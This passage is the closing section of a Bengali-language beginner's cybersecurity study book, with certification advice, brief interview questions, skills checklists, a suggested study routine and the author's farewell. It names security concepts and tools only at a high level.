+├── OSCP (Practical – সবচেয়ে সম্মানিত)
+└── CISM
+📖 ১২.২ কমন ইন্টারভিউ প্রশ্ন
+Q: What happens when you type google.com in a browser?
+A: DNS lookup → TCP handshake → TLS handshake → HTTP request → render
+
+Q: Diff between hashing and encryption?
+A: Hashing one-way, encryption two-way
+
+Q: What is XSS?
+A: Attacker injects malicious script into the website
+==========================
+
+
+✅ অধ্যায় ১২ চেকলিস্ট
+সার্টিফিকেশন রোডম্যাপ জানি
+
+OSCP কেন valuable জানি
+
+কমন ইন্টারভিউ প্রশ্নের উত্তর দিতে পারি
+
+🎯 বই শেষে মাস্টারি চেকলিস্ট
+আপনি নিচের সবগুলো করতে পারলেই আপনি জুনিয়র সিকিউরিটি অ্যানালিস্ট হওয়ার জন্য রেডি:
+
+ফাউন্ডেশন (অধ্যায় ১-২)
+Binary/Hex conversion হাতের লেখায় করতে পারি
+
+Buffer overflow কেন হয় বুঝি
+
+GDB দিয়ে basic debugging পারি
+
+লিনাক্স (অধ্যায় ৩)
+কমান্ড লাইনে আরামদায়ক
+
+SUID/SGID বুঝি
+
+Kali Linux চালাতে পারি
+
+নেটওয়ার্ক (অধ্যায় ৪)
+TCP flags জানি
+
+Nmap দিয়ে স্ক্যান করতে পারি
+
+Wireshark দিয়ে প্যাকেট দেখতে পারি
+
+প্রোগ্রামিং (অধ্যায় ৫)
+Python দিয়ে পোর্ট স্ক্যানার লিখতে পারি
+
+কেন eval() dangerous জানি
+
+ওয়েব সিকিউরিটি (অধ্যায় ৭)
+OWASP Top 10 জানি
+
+SQL injection বুঝি
+
+Burp Suite ব্যবহার করতে পারি
+
+💬 লেখকের শেষ কথা
+এই বইটি আপনার হাতে। এটি পারফেক্ট না, কিন্তু এটি আপনার জন্য বানানো।
+
+যেভাবে ব্যবহার করবেন:
+
+প্রথমবার: শুরু থেকে শেষ পর্যন্ত পড়ুন (ল্যাবগুলো না করলেও চলে)
+
+দ্বিতীয়বার: প্রতিটি ল্যাব হাতে-কলমে করুন
+
+তৃতীয়বার: শুধু চেকলিস্ট দেখে নিজেকে টেস্ট করুন
+
+এরপর: রেফারেন্স হিসেবে ব্যবহার করুন
+
+প্রতিদিনের রুটিন:
+
+text
+সকাল ১৫ মিনিট: গতকালের চেকলিস্ট রিভিউ
+বিকাল ২ ঘণ্টা: ল্যাব ও প্র্যাকটিস
+রাত ১৫ মিনিট: আগামীকালের অধ্যায় প্রিভিউ
+আমার কাছে আপনার জন্য অনুরোধ:
+
+এক মাসে সব শেষ করার চেষ্টা করবেন না। বরং প্রতি অধ্যায়ে ৩-৪ দিন দিন। তাহলে কনসেপ্ট গভীর হবে।
+
+আপনি যখন কোনো অধ্যায় শেষ করবেন, আমাকে জানাবেন। আমি আপনার জন্য পার্সোনালাইজড কুইজ তৈরি করে দেব।
+
+📌 বইয়ের তথ্য
+বিষয়	বিবরণ
+মোট অধ্যায়	১২টি
+মোট পৃষ্ঠা (প্রিন্ট করলে)	~১৫০ পৃষ্ঠা
+প্রস্তাবিত সময়	২-৩ মাস
+পূর্বশর্ত	কিছুই না
+খরচ	সম্পূর্ণ ফ্রি
+আপনার সাইবার সিকিউরিটি জার্নি শুভ হোক! 🚀🛡️
+
+#StayCurious #NeverStopLearning #CyberSecurity
+
